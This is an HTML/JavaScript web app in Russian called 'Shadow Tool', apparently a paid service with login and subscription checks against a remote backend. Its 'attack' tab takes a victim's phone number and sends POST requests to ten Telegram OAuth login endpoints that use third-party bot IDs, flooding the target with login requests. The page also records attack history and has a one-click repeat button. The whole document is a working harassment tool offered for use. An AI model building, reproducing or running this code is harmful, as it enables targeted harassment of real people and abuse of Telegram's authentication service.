<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Shadow Tool</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000000;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: #ffffff;
        }
        .container {
            max-width: 500px;
            width: 100%;
            background: #0a0a0a;
            border: 2px solid #00ff00;
            border-radius: 15px;
            padding: 25px;
            box-shadow: 0 0 30px rgba(0,255,0,0.2);
        }
        h1 {
            color: #00ff00;
            text-align: center;
            font-size: 32px;
            margin-bottom: 8px;
            letter-spacing: 3px;
            text-shadow: 0 0 10px #00ff00;
        }
        .version {
            text-align: center;
            color: #00cc00;
            font-size: 12px;
            margin-bottom: 20px;
        }
        .tabs {
            display: flex;
            gap: 8px;
            margin-bottom: 20px;
        }
        .tab-btn {
            flex: 1;
            background: #111111;
            border: 1px solid #00ff00;
            color: #00ff00;
            padding: 12px;
            cursor: pointer;
            text-align: center;
            font-weight: bold;
            border-radius: 8px;
        }
        .tab-btn.active {
            background: #00ff00;
            color: #000000;
        }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        input {
            width: 100%;
            padding: 14px;
            background: #111111;
            border: 1px solid #00ff00;
            color: #ffffff;
            font-size: 16px;
            margin: 10px 0;
            border-radius: 8px;
        }
        input::placeholder { color: #888888; }
        button {
            width: 100%;
            padding: 14px;
            background: #00ff00;
            border: none;
            color: #000000;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            margin: 8px 0;
            border-radius: 8px;
        }
        button:hover { opacity: 0.85; }
        .logs {
            height: 220px;
            overflow-y: auto;
            background: #050505;
            border: 1px solid #00ff00;
            margin-top: 15px;
            padding: 12px;
            font-size: 12px;
            border-radius: 8px;
        }
        .log {
            color: #00ff00;
            border-left: 3px solid #00ff00;
            padding-left: 10px;
            margin: 8px 0;
        }
        .error-log { border-left-color: #ff4444; color: #ff8888; }
        .status {
            position: fixed;
            bottom: 15px;
            right: 15px;
            background: #000000;
            border: 1px solid #00ff00;
            padding: 6px 12px;
            color: #00ff00;
            font-size: 11px;
            border-radius: 20px;
        }
        .sub-info {
            background: #111111;
            border: 1px solid #00ff00;
            border-radius: 8px;
            padding: 12px;
            margin-top: 15px;
            text-align: center;
        }
        .sub-label { font-size: 11px; color: #00cc88; margin-bottom: 5px; }
        .sub-days { font-size: 18px; font-weight: bold; color: #00ff00; }
        .stats {
            display: flex;
            gap: 12px;
            margin-bottom: 20px;
        }
        .stat-card {
            flex: 1;
            background: #111111;
            border: 1px solid #00ff00;
            text-align: center;
            padding: 12px;
            border-radius: 10px;
        }
        .stat-value { font-size: 28px; font-weight: bold; color: #00ff00; }
        .stat-label { font-size: 11px; color: #00cc88; margin-top: 5px; }
        .history-table { width: 100%; font-size: 12px; border-collapse: collapse; }
        .history-table th, .history-table td { padding: 8px; border-bottom: 1px solid #333333; text-align: left; color: #ffffff; }
        .history-table th { color: #00ff00; }
        .action-btn {
            background: #222222;
            border: 1px solid #00ff00;
            color: #00ff00;
            padding: 4px 10px;
            cursor: pointer;
            border-radius: 5px;
        }
        a { color: #00ff00; }
        @media (max-width: 500px) {
            .container { padding: 18px; }
            h1 { font-size: 24px; }
        }
    </style>
</head>
<body>
<div class="container" id="app">
    <h1>⚡ SHADOW TOOL</h1>
    <div class="version">v3.0</div>

    <!-- Формы входа/регистрации -->
    <div id="authForms">
        <div id="loginForm">
            <input type="text" id="loginLogin" placeholder="Логин">
            <input type="password" id="loginPassword" placeholder="Пароль">
            <button onclick="doLogin()">ВОЙТИ</button>
            <p style="text-align:center; margin-top:12px;">Нет аккаунта? <a href="#" onclick="showRegister()">Регистрация</a></p>
        </div>
        <div id="registerForm" style="display:none">
            <input type="text" id="regLogin" placeholder="Логин">
            <input type="password" id="regPassword" placeholder="Пароль">
            <button onclick="doRegister()">ЗАРЕГИСТРИРОВАТЬСЯ</button>
            <p style="text-align:center; margin-top:12px;">Уже есть аккаунт? <a href="#" onclick="showLogin()">Войти</a></p>
        </div>
        <div id="authError" style="color:#ff4444; text-align:center; margin-top:12px;"></div>
        <div id="authSuccess" style="color:#00ff44; text-align:center; margin-top:12px;"></div>
    </div>

    <!-- Основной контент -->
    <div id="mainContent" style="display:none;">
        <div class="tabs">
            <div class="tab-btn active" onclick="switchTab('attack')">АТАКА</div>
            <div class="tab-btn" onclick="switchTab('history')">ИСТОРИЯ</div>
        </div>

        <div id="attackTab" class="tab-content active">
            <input type="text" id="phone" placeholder="+375291234567">
            <button onclick="startAttack()">НАЧАТЬ АТАКУ</button>
            <div class="sub-info">
                <div class="sub-label">ДО ОКОНЧАНИЯ ПОДПИСКИ</div>
                <div class="sub-days" id="subDaysLeft">—</div>
            </div>
            <div class="logs" id="logs"></div>
        </div>

        <div id="historyTab" class="tab-content">
            <div class="stats">
                <div class="stat-card"><div class="stat-value" id="totalCount">0</div><div class="stat-label">АТАК</div></div>
                <div class="stat-card"><div class="stat-value" id="successRate">0%</div><div class="stat-label">УСПЕШНО</div></div>
            </div>
            <button onclick="clearHistory()">ОЧИСТИТЬ ИСТОРИЮ</button>
            <div style="overflow-x:auto; margin-top:15px;">
                <table class="history-table">
                    <thead><tr><th>Время</th><th>Номер</th><th>Статус</th><th></th></tr></thead>
                    <tbody id="historyBody"></tbody>
                </table>
            </div>
        </div>
    </div>
    <div class="status" id="status">ЗАГРУЗКА...</div>
</div>

<script>
    const API_BASE = 'https://use-production-88cf.up.railway.app';
    
    const ATTACK_URLS = [
        'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
        'https://translations.telegram.org/auth/request',
        'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
        'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
        'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
        'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
        'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
        'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin'
    ];

    let attackHistory = JSON.parse(localStorage.getItem('shadow_history')) || [];
    let currentToken = localStorage.getItem('token');
    let currentSubscription = false;
    let subscriptionExpires = null;

    // ========== АВТОРИЗАЦИЯ ==========
    async function doRegister() {
        const login = document.getElementById('regLogin').value;
        const password = document.getElementById('regPassword').value;
        if (!login || !password) {
            showAuthError('Заполните все поля');
            return;
        }
        showAuthError('');
        showAuthSuccess('');
        
        try {
            const res = await fetch(API_BASE + '/register', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ login, password })
            });
            const data = await res.json();
            if (data.success) {
                showAuthSuccess('Регистрация успешна! Теперь войдите.');
                showLogin();
                document.getElementById('loginLogin').value = login;
            } else {
                showAuthError(data.error);
            }
        } catch(e) {
            showAuthError('Ошибка соединения');
        }
    }

    async function doLogin() {
        const login = document.getElementById('loginLogin').value;
        const password = document.getElementById('loginPassword').value;
        if (!login || !password) {
            showAuthError('Заполните все поля');
            return;
        }
        showAuthError('');
        
        try {
            const res = await fetch(API_BASE + '/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ login, password })
            });
            const data = await res.json();
            if (data.success) {
                localStorage.setItem('token', data.token);
                currentToken = data.token;
                await checkAuthAndLoad();
            } else {
                showAuthError(data.error);
            }
        } catch(e) {
            showAuthError('Ошибка соединения');
        }
    }

    async function checkAuthAndLoad() {
        const token = localStorage.getItem('token');
        if (!token) {
            showAuth();
            return;
        }
        
        try {
            const meRes = await fetch(API_BASE + '/me', {
                headers: { 'Authorization': 'Bearer ' + token }
            });
            if (!meRes.ok) {
                localStorage.removeItem('token');
                showAuth();
                return;
            }
            
            const subRes = await fetch(API_BASE + '/check_subscription', {
                headers: { 'Authorization': 'Bearer ' + token }
            });
            const subData = await subRes.json();
            currentSubscription = subData.has_access;
            subscriptionExpires = subData.expires_at;
            
            showApp();
            updateHistoryDisplay();
            updateSubscriptionDisplay();
            
            if (currentSubscription) {
                document.getElementById('status').innerHTML = 'ГОТОВ';
            } else {
                document.getElementById('status').innerHTML = 'НЕТ ПОДПИСКИ';
            }
        } catch(e) {
            showAuth();
        }
    }

    function updateSubscriptionDisplay() {
        const subDaysSpan = document.getElementById('subDaysLeft');
        if (!subDaysSpan) return;
        
        if (!currentSubscription || !subscriptionExpires) {
            subDaysSpan.innerHTML = 'Нет подписки';
            subDaysSpan.style.color = '#ff8888';
            return;
        }
        
        const now = new Date();
        const expireDate = new Date(subscriptionExpires);
        const diffMs = expireDate - now;
        const diffDays = Math.ceil(diffMs / (1000 * 60 * 60 * 24));
        
        if (diffDays <= 0) {
            subDaysSpan.innerHTML = 'Истекла';
            subDaysSpan.style.color = '#ff8888';
        } else {
            subDaysSpan.innerHTML = diffDays + ' дн.';
            subDaysSpan.style.color = '#00ff00';
        }
    }

    function showAuth() {
        document.getElementById('authForms').style.display = 'block';
        document.getElementById('mainContent').style.display = 'none';
        document.getElementById('loginForm').style.display = 'block';
        document.getElementById('registerForm').style.display = 'none';
        document.getElementById('authError').innerText = '';
        document.getElementById('authSuccess').innerText = '';
    }

    function showApp() {
        document.getElementById('authForms').style.display = 'none';
        document.getElementById('mainContent').style.display = 'block';
    }

    function showAuthError(msg) {
        document.getElementById('authError').innerText = msg;
    }
    
    function showAuthSuccess(msg) {
        document.getElementById('authSuccess').innerText = msg;
    }

    function showRegister() {
        document.getElementById('loginForm').style.display = 'none';
        document.getElementById('registerForm').style.display = 'block';
        document.getElementById('authError').innerText = '';
        document.getElementById('authSuccess').innerText = '';
    }

    function showLogin() {
        document.getElementById('registerForm').style.display = 'none';
        document.getElementById('loginForm').style.display = 'block';
        document.getElementById('authError').innerText = '';
        document.getElementById('authSuccess').innerText = '';
    }

    // ========== АТАКА (без проверки формата) ==========
    async function startAttack() {
        if (!currentSubscription) {
            addLog('У ВАС НЕТ АКТИВНОЙ ПОДПИСКИ!', true);
            return;
        }
        
        const phone = document.getElementById('phone').value.trim();
        document.getElementById('logs').innerHTML = '';
        
        if (!phone) {
            addLog('Введите номер телефона', true);
            return;
        }
        
        // Убираем проверку формата — принимаем любой номер с плюсом
        if (!phone.startsWith('+')) {
            addLog('Номер должен начинаться с + (пример: +375291234567)', true);
            return;
        }

        addLog('Проверка белого списка...');
        try {
            const wRes = await fetch(API_BASE + '/is_whitelisted', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: phone })
            });
            const wData = await wRes.json();
            if (wData.blocked) {
                addLog('Номер в белом списке. Атака заблокирована.', true);
                return;
            }
        } catch(e) {
            addLog('Не удалось проверить белый список', true);
        }

        addLog(`Начинаю атаку на ${phone}`);
        document.getElementById('status').innerHTML = 'АТАКА...';
        
        let success = 0;
        for (let i = 0; i < ATTACK_URLS.length; i++) {
            try {
                await fetch(ATTACK_URLS[i], {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `phone=${encodeURIComponent(phone)}`
                });
                success++;
                addLog(`Запрос ${i+1}/${ATTACK_URLS.length} отправлен`);
            } catch(e) {
                addLog(`Запрос ${i+1}/${ATTACK_URLS.length}: ошибка`, true);
            }
            await new Promise(r => setTimeout(r, 100));
        }
        
        attackHistory.unshift({
            id: Date.now(),
            timestamp: new Date().toISOString(),
            phone: phone,
            success: success,
            total: ATTACK_URLS.length
        });
        if (attackHistory.length > 30) attackHistory.pop();
        localStorage.setItem('shadow_history', JSON.stringify(attackHistory));
        
        addLog(`АТАКА ЗАВЕРШЕНА! Успешно: ${success}/${ATTACK_URLS.length}`);
        document.getElementById('status').innerHTML = 'ГОТОВ';
        updateHistoryDisplay();
    }

    function addLog(msg, isError = false) {
        const logsDiv = document.getElementById('logs');
        const log = document.createElement('div');
        log.className = 'log' + (isError ? ' error-log' : '');
        log.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
        logsDiv.appendChild(log);
        logsDiv.scrollTop = logsDiv.scrollHeight;
    }

    // ========== ИСТОРИЯ ==========
    function updateHistoryDisplay() {
        const total = attackHistory.length;
        const successRate = total > 0 ? Math.round(attackHistory.filter(h => h.success === h.total).length / total * 100) : 0;
        document.getElementById('totalCount').innerText = total;
        document.getElementById('successRate').innerText = successRate + '%';
        
        const tbody = document.getElementById('historyBody');
        if (!tbody) return;
        
        if (total === 0) {
            tbody.innerHTML = '<tr><td colspan="4" style="color:#888; text-align:center;">История атак пуста</td></tr>';
            return;
        }
        
        tbody.innerHTML = attackHistory.map(h => `
            <tr>
                <td>${new Date(h.timestamp).toLocaleTimeString()}</td>
                <td style="color:#00ff00;">${h.phone}</td>
                <td style="color: ${h.success === h.total ? '#00ff00' : '#ff8888'}">${h.success}/${h.total}</td>
                <td><button class="action-btn" onclick="repeatAttack('${h.phone}')">↺</button></td>
            </tr>
        `).join('');
    }

    function repeatAttack(phone) {
        document.getElementById('phone').value = phone;
        switchTab('attack');
        setTimeout(() => startAttack(), 500);
    }

    function clearHistory() {
        if (confirm('Очистить всю историю?')) {
            attackHistory = [];
            localStorage.setItem('shadow_history', JSON.stringify(attackHistory));
            updateHistoryDisplay();
        }
    }

    function switchTab(tab) {
        document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
        document.querySelectorAll('.tab-btn').forEach(t => t.classList.remove('active'));
        if (tab === 'attack') {
            document.getElementById('attackTab').classList.add('active');
            document.querySelector('.tab-btn:first-child').classList.add('active');
        } else {
            document.getElementById('historyTab').classList.add('active');
            document.querySelectorAll('.tab-btn')[1].classList.add('active');
            updateHistoryDisplay();
        }
    }

    // ========== ЗАПУСК ==========
    checkAuthAndLoad();
    setInterval(() => updateSubscriptionDisplay(), 60000);
</script>
</body>
</html>
